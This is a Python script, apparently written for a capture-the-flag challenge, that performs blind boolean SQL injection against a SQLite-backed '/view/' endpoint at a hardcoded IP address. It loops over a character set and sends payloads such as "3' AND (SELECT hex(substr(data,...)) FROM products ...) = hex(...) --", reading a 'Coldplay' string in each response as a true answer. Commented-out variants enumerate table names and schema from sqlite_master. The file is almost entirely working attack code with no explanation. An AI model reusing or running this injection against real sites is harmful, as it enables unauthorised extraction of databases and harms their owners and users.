import os
import re
import string

import requests

BASE_URL = "http://34.124.192.13:54679/view/"

a = string.ascii_uppercase[::-1]
b = string.ascii_lowercase[::-1]
c = string.digits

charset = c + string.ascii_letters + "{_!}[]/\\'|"

table_name = ""
index = 1

# Table Name: products
"""
aaaaaa0aaaaa0products0000000id0aaaaaaa0aaaaaaa0aaa0aaaaaaaaaaaaa000000data0aaaa0aaa0aaaa000000createdaat0aaa0aaaa0aaaaaaa0aaaaaaaaaaaaaaaaa0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
"""
# products
# id
# data
# createdat

arr = [i for i in range(0xFF)]

while True:
    for idx, char in enumerate(charset):
        # 3' and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0)
        # PAYLOAD = f"3' and (SELECT hex(substr(tbl_name,{index},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') > hex('{char}') --"
        # PAYLOAD = f"3' and (SELECT hex(substr(tbl_name,{index},1)) FROM sqlite_master WHERE type !='meta' AND sql NOT NULL AND name = 'products') = hex('{char}') --"
        # PAYLOAD = f"3' AND (SELECT hex(substr(sql,{index},1)) FROM sqlite_master WHERE sql NOT NULL AND tbl_name = 'products') = hex('{char}') --"
        PAYLOAD = f"3' AND (SELECT hex(substr(data,{index},1)) FROM products LIMIT 1 OFFSET 3) = hex('{char}') --"
        # PAYLOAD = f"3' AND (SELECT hex(substr(products,{index},1)) FROM products LIMIT 1 OFFSET 0) = hex('{char}') --"
        URL = BASE_URL + PAYLOAD
        r = requests.get(URL)

        if "Coldplay" in r.text:
            table_name += char
            index += 1
            print(table_name)
            break

        if idx >= len((charset)) - 1:
            print(os._exit(-1))
            exit(-1)
